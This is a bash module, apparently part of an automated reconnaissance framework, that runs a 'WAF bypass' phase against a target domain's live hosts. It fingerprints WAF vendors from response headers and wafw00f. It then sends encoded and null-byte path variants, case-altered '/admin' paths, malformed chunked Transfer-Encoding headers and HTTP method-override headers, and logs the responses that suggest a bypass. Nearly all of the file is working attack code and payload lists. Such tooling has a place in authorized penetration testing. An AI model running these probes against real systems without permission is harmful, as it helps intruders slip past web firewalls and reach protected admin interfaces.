#!/bin/bash
# WAF/CDN bypass technique library, encoding bypasses, case manipulation, chunked transfer

waf_bypass_phase() {
    local domain="$1"
    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    local bypass_dir="$output_dir/waf_bypass"
    local live_file="$output_dir/live/live_subdomains.txt"

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true
    mkdir -p "$bypass_dir"

    log "INFO" "Starting WAF bypass testing for $domain"
    py_log "INFO" "waf_bypass_phase started" --phase "waf_bypass" --target "$domain" || true

    local waf_bypass="$bypass_dir/waf_bypass.txt"
    local waf_fingerprint="$bypass_dir/waf_fingerprint.txt"
    touch "$waf_bypass" "$waf_fingerprint"

    if [ ! -f "$live_file" ]; then
        log "WARN" "No live hosts file found, skipping WAF bypass testing"
        echo "0" > "$bypass_dir/count.txt"
        return 0
    fi

    # ------------------------------------------------------------------
    # 1. WAF fingerprinting via wafw00f
    # ------------------------------------------------------------------
    if tool_available "wafw00f"; then
        log "INFO" "Fingerprinting WAFs with wafw00f..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            wafw00f "$host" 2>>"$LOGS_DIR/wafw00f.log" >> "$waf_fingerprint" || true
        done < <(head -30 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 2. WAF fingerprint via response headers
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Fingerprinting WAFs via response headers..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            local headers
            headers=$(curl -s -D - -o /dev/null --max-time 10 "$host" 2>/dev/null) || true

            # Detect common WAF signatures
            echo "$headers" | grep -qiE "server: cloudflare" && echo "CLOUDFLARE: $host" >> "$waf_fingerprint" || true
            echo "$headers" | grep -qiE "server: awselb|server: amazons3|server: cloudfront" && echo "AWS_WAF: $host" >> "$waf_fingerprint" || true
            echo "$headers" | grep -qiE "server: akamaighost|x-akamai" && echo "AKAMAI: $host" >> "$waf_fingerprint" || true
            echo "$headers" | grep -qiE "server: bigip|server: tmnd" && echo "F5_BIGIP: $host" >> "$waf_fingerprint" || true
            echo "$headers" | grep -qiE "server: mod_security|server: whoson" && echo "MODSECURITY: $host" >> "$waf_fingerprint" || true
            echo "$headers" | grep -qiE "x-cdn: incapsula|x-iinfo" && echo "INCAPSULA: $host" >> "$waf_fingerprint" || true
            echo "$headers" | grep -qiE "x-sucuri-id|x-sucuri-cache" && echo "SUCURI: $host" >> "$waf_fingerprint" || true
            echo "$headers" | grep -qiE "server: ray|server: custom" && echo "CUSTOM_WAF: $host" >> "$waf_fingerprint" || true
        done < <(head -30 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 3. URL encoding bypasses
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing URL encoding bypasses..."
        local test_path="/admin"
        local encoded_paths
        encoded_paths=$(cat << 'ENCODEPATHS'
/admin
/%61dmin
/%2f%61%64%6d%69%6e
/admin%20
/admin%09
/admin%00
/admin.
/admin/./
/admin/.%00/
/admin..;/
/admin%2f%2f
/./admin
/..%00/admin
ENCODEPATHS
)

        while IFS= read -r host; do
            [ -z "$host" ] && continue
            while IFS= read -r enc_path; do
                [ -z "$enc_path" ] && continue
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${host%/}${enc_path}" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|301|302)$"; then
                    echo "URL_ENCODING_BYPASS: $host${enc_path} | Status: $code" >> "$waf_bypass"
                    write_finding "{\"type\":\"waf_url_encoding_bypass\",\"url\":\"$host${enc_path}\",\"severity\":\"high\",\"domain\":\"$domain\"}" "$bypass_dir/findings.json" || true
                fi
            done < <(echo "$encoded_paths")
        done < <(head -20 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 4. Case manipulation bypasses
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing case manipulation bypasses..."
        local case_paths
        case_paths=$(cat << 'CASEPATHS'
/ADMIN
/Admin
/AdMiN
/aDmIn
/ADMIN/
/ADMIN/.
CASEPATHS
)

        while IFS= read -r host; do
            [ -z "$host" ] && continue
            while IFS= read -r case_path; do
                [ -z "$case_path" ] && continue
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${host%/}${case_path}" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|301|302)$"; then
                    echo "CASE_BYPASS: $host${case_path} | Status: $code" >> "$waf_bypass"
                fi
            done < <(echo "$case_paths")
        done < <(head -20 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 5. Chunked transfer encoding bypass
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing chunked transfer encoding bypass..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            for chunked_variant in \
                "Transfer-Encoding: chunked" \
                "Transfer-Encoding: \tchunked" \
                "Transfer-Encoding: chunked\t" \
                "Transfer-Encoding: chunked, identity" \
                "Transfer-Encoding: identity, chunked" \
                "Transfer-Encoding : chunked" \
                "Transfer-Encoding: Chunked"; do
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
                    -H "$chunked_variant" \
                    -d "0\r\n\r\n" \
                    "$host" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|400|403|404|500)$"; then
                    echo "CHUNKED_BYPASS: $host | Variant: $chunked_variant | Status: $code" >> "$waf_bypass"
                fi
            done
        done < <(head -20 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 6. HTTP method override bypass
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing HTTP method override bypass..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            for method_header in "X-HTTP-Method-Override: DELETE" "X-HTTP-Method: DELETE" "X-Method-Override: DELETE" "_method=DELETE"; do
                local hdr_name="${method_header%%: *}"
                local hdr_val="${method_header#*: }"
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
                    -X GET -H "$hdr_name: $hdr_val" \
                    "${host%/}/admin" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|403)$"; then
                    echo "METHOD_OVERRIDE: $host | Header: $method_header | Status: $code" >> "$waf_bypass"
                fi
            done
        done < <(head -20 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 7. Null byte and special character bypass
    # ------------------------------------------------------------------
    if command -v curl >/dev/null 2>&1; then
        log "INFO" "Testing null byte and special character bypass..."
        while IFS= read -r host; do
            [ -z "$host" ] && continue
            for bypass in "/admin%00" "/admin%0a" "/admin%0d%0a" "/admin%09" "/admin%20" "/admin.html" "/admin.json" "/admin%23" "/admin%3F"; do
                local code
                code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${host%/}${bypass}" 2>/dev/null) || true
                if echo "$code" | grep -qE "^(200|301|302)$"; then
                    echo "NULL_BYTE_BYPASS: $host${bypass} | Status: $code" >> "$waf_bypass"
                fi
            done
        done < <(head -20 "$live_file")
    fi

    # ------------------------------------------------------------------
    # 8. Summary count
    # ------------------------------------------------------------------
    local bypass_count
    bypass_count=$(wc -l < "$waf_bypass" 2>/dev/null || echo 0)
    log "INFO" "WAF bypass testing complete: $bypass_count bypass techniques found"

    py_log "INFO" "waf_bypass_phase complete" --phase "waf_bypass" --target "$domain" --extra "{\"bypasses\":$bypass_count}" || true
    echo "$bypass_count" > "$bypass_dir/count.txt"
}

export -f waf_bypass_phase
